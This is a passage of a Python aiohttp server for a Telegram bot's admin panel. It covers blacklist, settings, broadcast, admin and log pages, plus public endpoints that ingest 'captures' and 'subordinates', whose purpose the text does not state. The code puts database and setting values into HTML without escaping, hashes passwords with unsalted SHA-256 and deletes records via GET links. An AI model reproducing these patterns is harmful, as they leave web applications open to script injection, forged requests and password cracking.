        rows = await c.fetch("SELECT * FROM blacklist ORDER BY added_at DESC")
    body = """<h1>🚫 Blacklist</h1>
    <div class="card">
        <form method="POST" action="/admin/blacklist/add">
            <div class="row">
                <input name="uid" placeholder="UID" required>
                <input name="reason" placeholder="Reason">
                <button class="btn red" type="submit">Add</button>
            </div>
        </form>
    </div>
    <table><tr><th>UID</th><th>Reason</th><th>Added</th><th>Action</th></tr>"""
    for r in rows:
        body += f"""<tr><td><code>{r['uid']}</code></td>
            <td>{r['reason'] or '—'}</td>
            <td class="mono">{r['added_at']}</td>
            <td><a class="btn" href="/admin/blacklist/delete/{r['uid']}">Remove</a></td></tr>"""
    if not rows:
        body += '<tr><td colspan="4" class="empty">No blacklist</td></tr>'
    body += '</table>'
    return web.Response(text=page("Blacklist", body, "bl"), content_type="text/html")


@admin_required
async def admin_blacklist_add(req):
    data = await req.post()
    async with POOL.acquire() as c:
        await c.execute("INSERT INTO blacklist (uid, reason) VALUES ($1,$2) "
                        "ON CONFLICT (uid) DO UPDATE SET reason=EXCLUDED.reason",
                        data.get("uid",""), data.get("reason",""))
    return web.HTTPFound("/admin/blacklist")


@admin_required
async def admin_blacklist_delete(req):
    uid = req.match_info["uid"]
    async with POOL.acquire() as c:
        await c.execute("DELETE FROM blacklist WHERE uid=$1", uid)
    return web.HTTPFound("/admin/blacklist")


# ---- SETTINGS ---------------------------------------------------------------

@admin_required
async def admin_settings(req):
    keys = ("welcome_text", "not_found_text", "register_url", "help_text",
            "blacklist_text", "daily_report_enabled", "daily_report_hour")
    vals = {k: await setting(k) for k in keys}
    body = f"""<h1>⚙ Settings</h1>
    <form method="POST" action="/admin/settings">
        <div class="card"><h2>Welcome</h2>
            <textarea name="welcome_text">{vals['welcome_text']}</textarea>
            <p class="mono" style="color:#7ae0c4">vars: {{uid}} {{name}} {{balance}}</p></div>
        <div class="card"><h2>Not Found</h2>
            <textarea name="not_found_text">{vals['not_found_text']}</textarea>
            <p class="mono" style="color:#7ae0c4">vars: {{uid}} {{link}}</p></div>
        <div class="card"><h2>Blacklisted</h2>
            <textarea name="blacklist_text">{vals['blacklist_text']}</textarea></div>
        <div class="card"><h2>Register URL</h2>
            <input name="register_url" value="{vals['register_url']}"></div>
        <div class="card"><h2>Help</h2>
            <textarea name="help_text">{vals['help_text']}</textarea></div>
        <div class="card"><h2>Daily Report</h2>
            <div class="row">
                <input name="daily_report_enabled" value="{vals['daily_report_enabled']}">
                <input name="daily_report_hour" value="{vals['daily_report_hour']}">
            </div></div>
        <button class="btn" type="submit">Save</button>
    </form>"""
    return web.Response(text=page("Settings", body, "set"), content_type="text/html")


@admin_required
async def admin_settings_post(req):
    data = await req.post()
    for k in ("welcome_text", "not_found_text", "register_url", "help_text",
              "blacklist_text", "daily_report_enabled", "daily_report_hour"):
        if k in data:
            await set_setting(k, data[k])
    return web.HTTPFound("/admin/settings")


# ---- BROADCAST --------------------------------------------------------------

@admin_required
async def admin_broadcast(req):
    body = """<h1>📢 Broadcast</h1>
    <div class="card">
        <form method="POST" action="/admin/broadcast">
            <textarea name="text" placeholder="Message (HTML allowed)" required></textarea>
            <button class="btn" type="submit" style="margin-top:.8rem">Send to All</button>
        </form>
    </div>"""
    return web.Response(text=page("Broadcast", body, "bc"), content_type="text/html")


@admin_required
async def admin_broadcast_post(req):
    data = await req.post()
    text = data.get("text", "")
    if not text or not TELEGRAM_BOT_TOKEN:
        return web.HTTPFound("/admin/broadcast")
    async with POOL.acquire() as c:
        users = await c.fetch("SELECT telegram_id FROM bot_users")
    import aiohttp
    sent = failed = 0
    async with aiohttp.ClientSession() as s:
        for u in users:
            try:
                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
                async with s.post(url, json={"chat_id": u["telegram_id"],
                                             "text": text, "parse_mode": "HTML"},
                                  timeout=aiohttp.ClientTimeout(total=8)) as r:
                    if r.status == 200: sent += 1
                    else: failed += 1
            except Exception:
                failed += 1
            await asyncio.sleep(0.05)
    body = f"""<h1>📢 Result</h1>
    <div class="card"><div class="stats">
        <div class="stat"><span class="n">{sent}</span><div class="l">Sent</div></div>
        <div class="stat"><span class="n">{failed}</span><div class="l">Failed</div></div>
    </div><a class="btn" href="/admin/broadcast">Back</a></div>"""
    return web.Response(text=page("Broadcast", body, "bc"), content_type="text/html")


# ---- ADMINS -----------------------------------------------------------------

@admin_required
async def admin_admins(req):
    async with POOL.acquire() as c:
        rows = await c.fetch("SELECT username, created_at FROM admins")
    body = """<h1>👤 Admins</h1>
    <div class="card">
        <form method="POST" action="/admin/admins/add">
            <div class="row">
                <input name="username" placeholder="username" required>
                <input name="password" type="password" placeholder="password" required>
                <button class="btn blue" type="submit">Add</button>
            </div>
        </form>
    </div>
    <table><tr><th>Username</th><th>Created</th><th>Action</th></tr>"""
    for r in rows:
        act = "—" if r["username"] == "admin" else f'<a class="btn red" href="/admin/admins/delete/{r["username"]}" onclick="return confirm(\'delete?\')">🗑</a>'
        body += f'<tr><td><b>{r["username"]}</b></td><td class="mono">{r["created_at"]}</td><td>{act}</td></tr>'
    body += "</table>"
    return web.Response(text=page("Admins", body, "adm"), content_type="text/html")


@admin_required
async def admin_admins_add(req):
    data = await req.post()
    user = data.get("username", "").strip()
    pw = data.get("password", "")
    if not user or not pw:
        return web.HTTPFound("/admin/admins")
    async with POOL.acquire() as c:
        try:
            await c.execute("INSERT INTO admins VALUES ($1,$2,CURRENT_TIMESTAMP)",
                            user, hashlib.sha256(pw.encode()).hexdigest())
        except Exception:
            pass
    return web.HTTPFound("/admin/admins")


@admin_required
async def admin_admins_delete(req):
    u = req.match_info["username"]
    if u == "admin":
        return web.HTTPFound("/admin/admins")
    async with POOL.acquire() as c:
        await c.execute("DELETE FROM admins WHERE username=$1", u)
    return web.HTTPFound("/admin/admins")


# ---- LOG --------------------------------------------------------------------

@admin_required
async def admin_log(req):
    async with POOL.acquire() as c:
        rows = await c.fetch("SELECT * FROM activity_log ORDER BY id DESC LIMIT 300")
    body = "<h1>📋 Activity Log</h1><table><tr><th>Admin</th><th>Action</th><th>Target</th><th>Time</th></tr>"
    for r in rows:
        body += f'<tr><td>{r["admin"]}</td><td>{r["action"]}</td><td class="mono">{r["target"]}</td><td class="mono">{r["ts"]}</td></tr>'
    if not rows:
        body += '<tr><td colspan="4" class="empty">No activity</td></tr>'
    body += "</table>"
    return web.Response(text=page("Activity", body, "log"), content_type="text/html")


# ---- DAILY REPORT TASK ------------------------------------------------------

async def daily_report_task():
    last_sent = ""
    while True:
        try:
            enabled = await setting("daily_report_enabled", "1")
            hour = int(await setting("daily_report_hour", "23"))
            now = time.localtime()
            today = time.strftime("%Y-%m-%d", now)
            if enabled == "1" and now.tm_hour == hour and last_sent != today:
                async with POOL.acquire() as c:
                    n_cap = await c.fetchval("SELECT COUNT(*) FROM captures")
                    n_sub = await c.fetchval("SELECT COUNT(*) FROM subordinates")
                    n_q = await c.fetchval("SELECT COUNT(*) FROM query_history WHERE date(queried_at)=CURRENT_DATE")
                    n_found = await c.fetchval("SELECT COUNT(*) FROM query_history WHERE date(queried_at)=CURRENT_DATE AND result='found'")
                    n_new = await c.fetchval("SELECT COUNT(*) FROM bot_users WHERE date(first_seen)=CURRENT_DATE")
                await notify(
                    f"📊 <b>Daily Report</b>\n\n"
                    f"📱 Total captures: {n_cap}\n"
                    f"👥 Total subordinates: {n_sub}\n"
                    f"📜 Queries today: {n_q}\n"
                    f"✅ Found today: {n_found}\n"
                    f"🤖 New users: {n_new}")
                last_sent = today
        except Exception:
            pass
        await asyncio.sleep(60 * 5)


# ---- APP --------------------------------------------------------------------

async def on_startup(app):
    await init_pool()
    await init_db()
    asyncio.create_task(daily_report_task())


def make_app():
    app = web.Application()
    app.on_startup.append(on_startup)

    # public
    app.router.add_get("/", handle_root)
    app.router.add_get("/health", handle_health)
    app.router.add_post("/api/public/captures-ingest", handle_ingest)
    app.router.add_post("/api/public/subordinates-ingest", handle_subs_ingest)
    app.router.add_get("/api/public/check-uid", handle_check_uid)
    app.router.add_post("/api/public/query-log", handle_query_log)
    app.router.add_get("/api/public/bot-stats", handle_bot_stats)
    app.router.add_get("/api/public/bot-settings", handle_settings_public)

    # admin
    app.router.add_get("/admin", admin_dashboard)
    app.router.add_get("/admin/", admin_dashboard)
    app.router.add_get("/admin/login", admin_login_get)
    app.router.add_post("/admin/login", admin_login_post)
    app.router.add_get("/admin/logout", admin_logout)

    app.router.add_get("/admin/captures", admin_captures)
    app.router.add_get("/admin/captures/export", admin_captures_export)
    app.router.add_get("/admin/captures/delete/{id}", admin_captures_delete)
    app.router.add_get("/admin/captures/edit/{id}", admin_captures_edit)
    app.router.add_post("/admin/captures/edit/{id}", admin_captures_edit_post)
    app.router.add_post("/admin/captures/add", admin_captures_add)

    app.router.add_get("/admin/subs", admin_subs)
    app.router.add_get("/admin/subs/export", admin_subs_export)
    app.router.add_get("/admin/subs/delete/{id}", admin_subs_delete)
    app.router.add_post("/admin/subs/add", admin_subs_add)

    app.router.add_get("/admin/users", admin_users)
    app.router.add_get("/admin/users/delete/{id}", admin_users_delete)

    app.router.add_get("/admin/queries", admin_queries)
    app.router.add_get("/admin/queries/export", admin_queries_export)

    app.router.add_get("/admin/blacklist", admin_blacklist)
    app.router.add_post("/admin/blacklist/add", admin_blacklist_add)
    app.router.add_get("/admin/blacklist/delete/{uid}", admin_blacklist_delete)

    app.router.add_get("/admin/settings", admin_settings)
    app.router.add_post("/admin/settings", admin_settings_post)

    app.router.add_get("/admin/broadcast", admin_broadcast)
    app.router.add_post("/admin/broadcast", admin_broadcast_post)

    app.router.add_get("/admin/admins", admin_admins)
    app.router.add_post("/admin/admins/add", admin_admins_add)
    app.router.add_get("/admin/admins/delete/{username}", admin_admins_delete)

    app.router.add_get("/admin/log", admin_log)

    return app


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    print(f"[knt] server v3 on :{port}")
    web.run_app(make_app(), host="0.0.0.0", port=port)
